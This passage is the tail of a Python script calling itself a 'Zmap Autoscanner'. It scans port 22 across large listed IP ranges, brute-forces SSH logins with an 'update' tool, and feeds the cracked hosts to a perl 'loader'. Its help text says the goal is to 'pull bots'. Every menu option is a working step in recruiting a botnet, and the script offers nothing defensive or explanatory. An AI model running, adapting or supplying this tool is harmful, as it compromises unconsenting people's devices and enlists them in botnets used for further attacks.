79.105.185.0/24 79.105.186.0/24 79.105.187.0/24 79.105.188.0/23 79.105.192.0/23 79.105.194.0/24 79.105.197.0/24 79.105.209.0/24 79.105.213.0/24 79.105.214.0/23 79.105.216.0/21 79.105.224.0/22 79.105.228.0/22 79.105.232.0/23 79.105.234.0/23 79.105.236.0/22 79.105.240.0/22 79.105.244.0/22 79.105.248.0/22 79.105.252.0/23 79.105.255.0/24 79.126.0.0/18 79.126.64.0/18 79.133.64.0/19 79.133.128.0/19 80.68.14.0/24 80.68.15.0/24 80.71.208.0/20 80.71.208.0/24 80.95.32.0/20 80.95.38.0/23 80.234.0.0/17 81.2.6.0/23 81.2.44.0/23 81.2.48.0/23 81.2.56.0/21 81.23.150.0/24 81.23.151.0/24 81.23.152.0/24 81.23.153.0/24 81.23.154.0/24 81.23.155.0/24 81.23.157.0/24 81.27.48.0/20 81.89.125.0/24 81.176.216.0/24 81.177.96.0/19 81.177.100.0/24 81.177.101.0/24 81.177.102.0/24 81.177.103.0/24 81.177.122.0/24 81.177.126.0/24 81.177.127.0/24 82.162.0.0/24 82.162.0.0/23 82.162.1.0/24 82.162.12.0/23 82.162.48.0/21 82.162.176.0/23 82.162.180.0/22 82.162.184.0/21 82.208.64.0/18 82.208.100.0/23 82.208.124.0/23 82.208.126.0/23 83.136.112.0/21 83.217.10.0/24 83.219.0.0/19 83.239.42.0/23 84.53.194.0/24 84.53.198.0/24 84.53.207.0/24 84.53.212.0/22 84.53.216.0/24 84.53.220.0/22 84.53.224.0/24 84.53.226.0/23 84.53.229.0/24 84.53.231.0/24 84.53.233.0/24 84.53.234.0/24 84.53.235.0/24 84.53.248.0/21 84.54.209.0/24 84.54.211.0/24 84.54.219.0/24 84.54.248.0/24 84.54.255.0/24 85.15.128.0/18 85.28.224.0/22 85.28.228.0/22 85.28.232.0/22 85.93.32.0/19 85.93.49.0/24 85.93.58.0/24 85.93.58.0/23 85.93.59.0/24 85.93.60.0/24 85.95.160.0/19 85.95.186.0/23 85.112.32.0/19 85.113.208.0/20 85.113.214.0/24 85.114.89.0/24 85.116.96.0/19 85.172.78.0/24 85.172.172.0/24 85.173.0.0/22 85.173.16.0/20 85.174.192.0/19 85.175.16.0/20 85.175.112.0/20 85.175.128.0/20 85.175.176.0/20 85.175.240.0/20 85.192.128.0/18 85.192.168.0/23 85.233.128.0/19 85.237.32.0/19 86.102.0.0/19 86.102.32.0/20 86.102.140.0/23 86.102.188.0/23 86.102.204.0/23 86.102.234.0/23 87.103.128.0/21 87.103.144.0/21 87.103.144.0/20 87.103.156.0/22 87.103.168.0/22 87.103.172.0/22 87.103.192.0/22 87.103.196.0/22 87.103.200.0/22 87.103.204.0/22 87.103.208.0/21 87.103.232.0/21 87.103.240.0/20 87.117.163.0/24 87.117.169.0/24 87.117.172.0/24 87.117.173.0/24 87.117.174.0/24 87.117.175.0/24 87.117.176.0/24 87.117.178.0/24 87.117.179.0/24 87.117.180.0/24 87.117.181.0/24 87.117.182.0/24 87.117.185.0/24 87.117.186.0/24 87.117.187.0/24 87.117.189.0/24 87.117.191.0/24 87.119.224.0/19 87.225.23.0/24 87.225.26.0/24 87.225.32.0/22 87.225.42.0/24 87.225.58.0/23 87.225.60.0/22 87.225.64.0/21 87.225.72.0/23 87.225.74.0/24 87.225.84.0/24 87.225.88.0/22 87.225.98.0/23 87.225.107.0/24 87.225.121.0/24 87.225.124.0/23 87.225.127.0/24 87.226.128.0/17 88.85.176.0/21 88.147.128.0/17 88.147.242.0/23 88.200.128.0/17 88.200.136.0/23 88.200.214.0/23 88.205.128.0/17 88.205.192.0/21 88.205.192.0/20 88.205.200.0/21 88.205.216.0/21 88.205.224.0/21 88.205.232.0/21 88.205.240.0/20 88.215.182.0/24 88.215.186.0/24 89.20.96.0/20 89.20.97.0/24 89.20.112.0/20 89.109.0.0/18 89.109.165.0/24 89.151.128.0/18 89.151.188.0/23 89.204.0.0/17 89.204.112.0/21 89.204.112.0/20 89.204.120.0/21 89.232.192.0/18 89.239.128.0/18 89.248.113.0/24 89.248.114.0/23 89.248.116.0/22 89.248.120.0/23 89.250.160.0/22 89.250.164.0/23 89.250.166.0/23 89.250.168.0/23 89.250.171.0/24 89.250.174.0/23 89.254.192.0/18 90.150.16.0/20 90.150.32.0/20 90.150.48.0/20 90.150.80.0/20 90.150.96.0/20 90.150.112.0/20 90.150.160.0/20 90.150.176.0/20 90.150.192.0/20 90.150.208.0/20 90.150.240.0/20 90.151.0.0/20 90.151.32.0/24 90.151.33.0/24 90.151.34.0/24 90.151.35.0/24 90.151.36.0/22 90.151.40.0/21 90.151.48.0/20 90.151.64.0/20 90.151.80.0/20 90.151.80.0/21 90.151.88.0/21 90.151.112.0/20 90.151.144.0/20 90.151.176.0/20 90.151.192.0/20 90.151.208.0/20 90.151.224.0/20 90.151.240.0/21 90.151.252.0/23 90.151.254.0/23 90.154.104.0/21 90.154.108.0/22 90.188.0.0/19 90.188.32.0/19 90.188.64.0/19 90.188.96.0/20 90.188.112.0/21 90.188.124.0/23 90.188.126.0/23 90.188.128.0/19 90.188.128.0/18 90.188.160.0/19 90.188.224.0/21 90.188.224.0/19 90.188.240.0/21 90.189.0.0/19 90.189.0.0/18 90.189.32.0/19 90.189.64.0/19 90.189.96.0/20 90.189.112.0/20 90.189.128.0/17 90.189.133.0/24 90.189.134.0/23 90.189.137.0/24 90.189.138.0/23 90.189.140.0/22 90.189.144.0/24 90.189.148.0/24 90.189.150.0/24 90.189.156.0/23 90.189.161.0/24 90.189.162.0/24 90.189.166.0/24 90.189.171.0/24 90.189.173.0/24 90.189.174.0/23 90.189.177.0/24 90.189.179.0/24 90.189.181.0/24 90.189.184.0/21 90.189.192.0/23 90.189.194.0/23 90.189.199.0/24 90.189.200.0/21 90.189.220.0/24 90.189.222.0/24 90.189.223.0/24 90.189.224.0/19 91.106.232.0/23 91.106.234.0/24 91.106.235.0/24 91.106.236.0/24 91.106.237.0/24 91.106.238.0/24 91.106.239.0/24 91.122.192.0/18 91.226.92.0/22 91.228.48.0/24 91.228.49.0/24 91.228.50.0/24 91.228.51.0/24 92.37.128.0/24 92.37.128.0/21 92.37.130.0/23 92.37.135.0/24 92.37.136.0/22 92.37.140.0/23 92.37.142.0/23 92.37.144.0/22 92.101.128.0/18 92.124.0.0/14 92.124.0.0/19 92.124.0.0/18 92.124.32.0/19 92.124.64.0/19 92.124.64.0/18 92.124.96.0/19 92.124.128.0/19 92.124.160.0/23 92.124.162.0/23 92.124.192.0/19 92.124.204.0/23 92.124.206.0/23 92.124.208.0/21 92.124.216.0/24 92.124.217.0/24 92.124.218.0/24 92.125.0.0/20 92.125.16.0/20 92.125.32.0/19 92.125.48.0/20 92.125.128.0/20 92.125.128.0/17 92.125.144.0/21 92.125.157.0/24 92.126.0.0/18 92.126.64.0/18 92.126.128.0/20 92.126.128.0/19 92.126.144.0/22 92.126.192.0/19 92.126.224.0/19 92.127.0.0/18 92.127.64.0/19 92.127.96.0/19 92.127.128.0/20 92.127.128.0/17 92.127.144.0/21 92.127.160.0/19 92.127.192.0/18 92.252.128.0/17 93.120.128.0/18 93.120.192.0/18 93.124.0.0/17 93.177.32.0/24 93.177.33.0/24 93.177.56.0/21 93.178.124.0/23 93.181.240.0/21 93.181.248.0/21 93.185.16.0/23 93.185.16.0/20 93.185.18.0/23 93.185.20.0/22 93.185.24.0/24 93.185.25.0/24 93.185.26.0/23 93.185.28.0/23 93.185.30.0/24 94.25.0.0/17 94.50.0.0/20 94.50.16.0/20 94.50.32.0/20 94.50.48.0/20 94.50.64.0/20 94.50.80.0/20 94.50.96.0/20 94.50.160.0/20 94.50.176.0/20 94.50.192.0/20 94.50.208.0/20 94.50.224.0/20 94.50.240.0/20 94.51.0.0/19 94.51.32.0/19 94.51.64.0/20 94.51.80.0/20 94.51.98.0/23 94.51.160.0/20 94.51.192.0/20 94.51.208.0/20 94.51.224.0/20 94.51.240.0/21 94.51.248.0/24 94.51.249.0/24 94.51.250.0/24 94.51.251.0/24 94.51.253.0/24 94.51.254.0/24 94.51.255.0/24 94.75.128.0/21 94.75.136.0/21 94.75.144.0/21 94.75.152.0/21 94.75.160.0/21 94.75.168.0/21 94.75.176.0/21 94.75.184.0/21 94.78.192.0/18 94.233.46.0/24 94.233.192.0/19 94.233.224.0/19 94.241.192.0/18 94.242.128.0/24 94.242.129.0/24 94.242.130.0/24 94.242.131.0/24 94.242.132.0/24 94.242.133.0/24 94.242.134.0/24 94.242.135.0/24 94.242.136.0/24 94.242.137.0/24 94.242.138.0/24 94.242.139.0/24 94.242.140.0/24 94.242.141.0/24 94.242.142.0/24 94.242.143.0/24 94.242.152.0/24 94.242.153.0/24 94.242.154.0/24 94.242.155.0/24 94.242.156.0/24 94.242.157.0/24 94.242.158.0/24 94.242.159.0/24 94.242.161.0/24 94.242.162.0/24 94.242.163.0/24 94.242.164.0/24 94.242.165.0/24 94.242.166.0/24 94.242.167.0/24 94.242.172.0/24 94.242.173.0/24 94.242.174.0/24 94.242.175.0/24 94.242.176.0/24 94.242.177.0/24 94.242.178.0/24 94.242.179.0/24 94.242.180.0/24 94.242.181.0/24 94.242.182.0/24 94.242.183.0/24 94.242.184.0/24 94.242.185.0/24 94.242.186.0/24 94.242.187.0/24 94.242.188.0/24 94.242.190.0/24 94.242.191.0/24 94.245.128.0/23 94.245.128.0/22 94.245.130.0/23 94.245.132.0/23 94.245.132.0/22 94.245.134.0/23 94.245.160.0/20 94.245.160.0/19 94.245.176.0/20 94.255.1.0/24 94.255.4.0/24 94.255.8.0/24 -omfu.txt')
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "10":
    a = raw_input('Select Your Loader-')
    run('zmap -p22 178.46.192.0/20 178.46.192.0/21 178.46.200.0/22 178.46.204.0/22 178.47.128.0/20 178.47.64.0/19 178.47.64.0/21 178.47.72.0/21 178.47.80.0/22 178.47.84.0/22 178.47.88.0/22 178.47.92.0/22 188.16.106.0/23 188.16.108.0/22 188.16.112.0/21 188.16.120.0/21 188.16.64.0/18 188.16.64.0/20 188.16.80.0/21 188.16.88.0/22 188.17.144.0/20 188.17.64.0/19 188.17.80.0/20 188.18.100.0/22 188.18.64.0/19 188.18.64.0/20 188.18.80.0/21 188.18.88.0/22 188.18.92.0/22 188.18.96.0/21 188.18.96.0/22 188.19.104.0/21 188.19.144.0/20 188.19.144.0/21 188.19.152.0/21 188.19.16.0/20 188.19.240.0/20 188.19.96.0/20 188.19.96.0/21 212.120.160.0/19 212.120.172.0/24 212.120.176.0/24 212.120.179.0/24 212.120.181.0/24 212.120.185.0/24 31.162.0.0/18 31.162.0.0/19 31.162.32.0/19 31.163.224.0/19 31.163.224.0/21 31.163.232.0/21 31.163.240.0/21 31.163.248.0/21 37.76.128.0/19 37.76.128.0/20 37.76.144.0/20 37.79.0.0/19 37.79.128.0/20 37.79.248.0/22 37.79.248.0/24 37.79.249.0/24 37.79.250.0/24 5.140.165.0/24 5.140.176.0/21 5.140.176.0/22 5.140.180.0/22 5.140.184.0/21 5.140.184.0/22 5.140.188.0/22 5.140.212.0/24 5.140.233.0/24 5.140.64.0/19 5.140.64.0/20 5.140.80.0/20 5.140.96.0/20 5.141.192.0/22 5.141.192.0/24 5.141.193.0/24 5.141.194.0/24 5.141.195.0/24 5.141.22.0/24 5.141.228.0/23 5.141.228.0/24 5.141.229.0/24 5.141.230.0/23 5.141.230.0/24 5.141.231.0/24 5.141.232.0/24 5.141.244.0/24 5.141.245.0/24 5.141.246.0/24 5.141.252.0/24 5.141.8.0/24 5.141.81.0/24 5.141.86.0/24 83.219.0.0/19 83.219.16.0/24 83.219.8.0/24 88.205.192.0/20 89.20.112.0/20 89.204.112.0/20 89.20.96.0/20 90.150.112.0/20 90.150.112.0/21 90.150.120.0/21 90.150.176.0/20 90.150.208.0/20 90.150.216.0/22 90.151.208.0/20 90.151.208.0/21 90.151.216.0/21 90.151.32.0/24 90.151.33.0/24 90.151.34.0/24 90.151.35.0/24 90.151.36.0/22 90.151.40.0/21 94.50.0.0/20 94.50.0.0/24 94.50.1.0/24 94.50.160.0/20 94.50.160.0/22 94.50.164.0/22 94.50.168.0/22 94.50.172.0/22 94.50.176.0/20 94.50.176.0/21 94.50.184.0/21 94.50.2.0/24 94.50.240.0/20 -omfu.txt')
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + a + ' vuln')
 elif wifi == "SetupMyShit":
    run('yum install screen -y')
    run('yum install cpan wget curl glibc.i686 -y')
    run('cpan force install Parallel::ForkManager')
    run('cpan force install IO::Socket')
    run('cpan force install IO::Select')
    run('yum install gcc php-devel php-pear libssh2 libssh2-devel libpcap -y')
    run('pecl install -f ssh2')
    run('touch /etc/php.d/ssh2.ini')
    run('cpan force install Net::SSH2')
    run('yum update -y')
    run('yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y')
    run('yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y')
    run('yum install epel-release -y')
    run('yum install gengetopt -y')
    run('wget https://github.com/zmap/zmap/archive/v2.1.0.tar.gz')
    run('tar -xvf v2.1.0.tar.gz')
    run('cd zmap-2.1.0')
    run('flex -o "src/lexer.c" --header-file="src/lexer.h" "src/lexer.l"')
    run('byacc -d -o "src/parser.c" "src/parser.y"')
    run('mkdir /etc/zmap')
    run('cp conf/* /etc/zmap')
    run('cmake -DENABLE_HARDENING=ON')
    run('make')
    run('make install')
    run('cpan force install Parallel::ForkManager')
 elif wifi == "LST1":
    run('clear')
    a = raw_input('\x1b[1;34mEnter LST name:')
    b = raw_input('\x1b[1;34mSelect Your Loader:')
    run('zmap -p22 -omfu.txt -w' + a)
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > vuln')
    run('perl ' + b + ' vuln')
 elif wifi == "LST2": 
    run('clear')
    c = raw_input('\x1b[1;34mEnter LST name: ')
    d = raw_input('\x1b[1;34mEnter LST name: ')
    e = raw_input('\x1b[1;34mSelect Your Loader: ')
    run('zmap -p22 -omfu.txt -w' + c)
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > lst1.txt')
    run('zmap -p22 -omfu.txt -w' + d)
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > lst2.txt')
    run('cat lst1.txt lst2.txt > 2.txt')
    run('perl ' + e + ' 2.txt')
 elif wifi == "LST3":
    run('clear')
    f = raw_input('\x1b[1;34mEnter LST name: ')
    g = raw_input('\x1b[1;34mEnter LST name: ')
    h = raw_input('\x1b[1;34mEnter LST name: ')
    i = raw_input('\x1b[1;34mSelect Your Loader: ')
    run('zmap -p22 -omfu.txt -w' + f)
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > lst1.txt')
    run('zmap -p22 -omfu.txt -w' + g)
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > lst2.txt')
    run('zmap -p22 -omfu.txt -w' + h)
    run('chmod 777 *')
    run('./update 1500')
    run('cat vuln.txt | grep -v DUP > lst3.txt')
    run('cat lst1.txt lst2.txt lst3.txt > 3.txt')
    run('perl ' + i + ' 3.txt')



 

 elif wifi == "HELP":
  run('clear')
  print("\x1b[1;36mBy typing SetupMyShit you will be installing scanner.sh and zmap.sh meaning you dont need to add a zmap.sh or scanner.sh  file to your server it will install without it.This also bypasses that error you may get when using a perl loader")




  print("\x1b[1;32mBy pressing 1 you are doing a worldscan this bitch can take hours or even days but great results")



  print("\x1b[1;32mBy pressing 2 you are doing a small scan this bitch will only take minutes but wont pull much bots")



  print("\x1b[1;32mBy pressing 3 you are doing a decent scan which usually takes around 5-6 minutes depending on your server")



  print("\x1b[1;32mBy pressing 4 you are doing a godly scan you should pull a decent amount but depends on passfile and server speed")



  print("\x1b[1;32mBy pressing 5 you are scanning stricly huawei devices")



  print("\x1b[1;32mBy pressing 6 you are scanning vulnerable SouthAmerican ip ranges")



  print("\x1b[1;32mBy pressing 7 it scans ip ranges based in brazil usually pulls alot")



  print("\x1b[1;32mBy pressing 8 it will scan ip ranges based in india this also pulls a pretty good amount")



  print("\x1b[1;32mBy pressing 9 will scan as.lst its a lst that seems to usually pull a decent amount and its quick asf")



  print("\x1b[1;32mBy pressing 10 will scan Fuck.lst this is also a lst that pulls good results in a fast period of time")



  print("\x1b[1;34mThe LST option allows you to scan your own LST files. To use this option type LST and the number of LST files you want to scan example LST3 this will scan 3 LST files, brute them then load them.so only options for this to work is LST1 LST2 LST3")







  print("\x1b[1;31mIf after all this and you fucks still cant get it too work reinstall your server and go play cards dumb bitchs")





except KeyboardInterrupt:
  run("clear")
  print("\x1b[1;34mZmap Autoscanner made by Gta5god")
